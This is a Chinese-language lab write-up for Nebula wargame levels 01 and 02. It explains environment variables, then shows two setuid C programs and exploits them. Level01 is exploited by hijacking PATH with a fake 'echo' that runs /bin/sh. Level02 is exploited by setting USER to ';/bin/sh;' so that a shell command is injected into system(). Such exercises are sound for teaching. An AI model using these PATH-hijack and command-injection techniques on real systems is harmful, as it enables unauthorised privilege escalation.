# <center>Linux下漏洞分析入门实验1</center>

## 实验概述

### 【目的】
1. 运行level01,反弹shell。
2. 运行level02，反弹shell。
### 【环境】
Linux
### 【工具】
shell
### 【原理】
环境变量
在所有 Unix 和 类Unix系统中, 每个进程都有其各自的环境变量设置。 缺省情况下, 当一个进程被创建时， 除了创建过程中的明确更改外，它继承了其父进程的绝大部分环境设置。 在API层级上, 使用fork和exec函数进行变量设置。或利用bashshell文件, 使用特殊的命令调用来改变环境变量：通过env 间接替代或者使用ENVIRONMENT_VARIABLE=VALUE <command> 标识. 所有的Unix操作系统 以及DOS 和Microsoft Windows 都是用环境变量，但是它们使用不同的环境变量名称。我们可以通过运行程序来访问环境变量的值。环境变量的例子包括：

PATH 罗列出 shell 搜索 用户 输入的执行命令所在的目录。
HOME (类Unix系统) 和 userprofile (Microsoft Windows) 表示用户的主目录在文件系统中的位置。
TERM (类Unix系统) 指定使用终端或虚拟终端 的类型 (如, vt100 or dumb)。
CVS_RSH (类Unix系统) 该选项可用于 ext 方式中指明 cvs 客户端寻找远端 shell 的路径，用作连接 cvs 服务器和以更高的优先权覆盖 $CVS_RSH 环境变量中指定的路径。
MAIL (类Unix系统) 当前用户的邮件存放目录。
Shell 脚本 和 批处理文件 使用环境变量来存储临时值，用于以后在脚本中引用，也用于传递数据和参数给子进程。 在Unix系统中，一个在脚本或程序中更改的环境变量值只会影响该进程，亦可能影响其子进程。其父进程和无关进程将不受影响。在DOS中，更改或删除一个批处理文件中的环境变量值将改变变量的期限命令的存在。

在Unix系统通过初始化脚本启动时，环境变量通常会在此时被初始化，因此会被系统中的其它进程所继承。用户可以而且经常添加环境变量到他们使用的shell脚本中。 在Windows系统中，环境变量的缺省值存储在 windows 注册表 中，或者在 autoexec.bat 自动执行的批处理文件中设置。
## 实验步骤

### 【步骤】

#### level01
查看源码
```
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
    gid_t gid;
    uid_t uid;
    gid = getegid();
    uid = geteuid();

    setresgid(gid, gid, gid);
    setresuid(uid, uid, uid);

    system("/usr/bin/env echo and now what?");
}
```
system()函数执行命令，其中使用环境变量的PATH路径下查找echo命令并显示and now what?
尝试运行，发现与预料中的结果一致。
```
~/nebula$ ./level01 
and now what?
```
要getshell，就需要运行system("/bin/sh")这里echo看起来是写死了不可改变的，但前面有`/usr/bin/env`,因此可以尝试修改环境变量。
在从环境变量制定的路径下查找echo时，会从第一个路径开始检索echo，如果在前面找到了echo，那么后面的路径就不会再遍历了，这是一个节约时间的策略，但是也就存在了我们可以利用的空间。
如果我们在PATH的最前面插入一个目录，其中包含一个可执行的假的echo，内容是`/bin/sh`，那么就可以执行system("/bin/sh")。
```
lometsj@ubuntu:~/nebula$ pwd        #显示当前目录
/home/lometsj/nebula
lometsj@ubuntu:~/nebula$ export PATH=/home/lometsj/nebula:$PATH   #把当前目录加到PATH的最前面
lometsj@ubuntu:~/nebula$ echo "/bin/sh" >echo                     #在当前目录伪造一个echo
lometsj@ubuntu:~/nebula$ chmod +x echo                            #加上可执行权限
lometsj@ubuntu:~/nebula$ ./level01                                #运行，getshell
$ echo u got it
u got it
$ exit


```
#### level02
查看源码
```
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  char *buffer;

  gid_t gid;
  uid_t uid;

  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  buffer = NULL;

  asprintf(&buffer, "/bin/echo %s is cool", getenv("USER"));
  printf("about to call system(\"%s\")\n", buffer);
  
  system(buffer);
}
```
可以看到程序从环境变量的USER读取字符串通过"/bin/echo %s is cool"格式化写入到buffer，并且用system()执行buffer。目的很明确，我们需要修改USER。
要想执行system("/bin/sh"),先要使前面的"/bin/echo"结束。
在shell语法中，一条指令以`;`结束。
于是有
```
$ export USER=";/bin/sh;"
$ ./level02
about to call system("/bin/echo ;/bin/sh; is cool")

$ echo u got it
u got it


```
### 【总结】

本次实验主要熟悉了Linux的环境变量方面的漏洞。
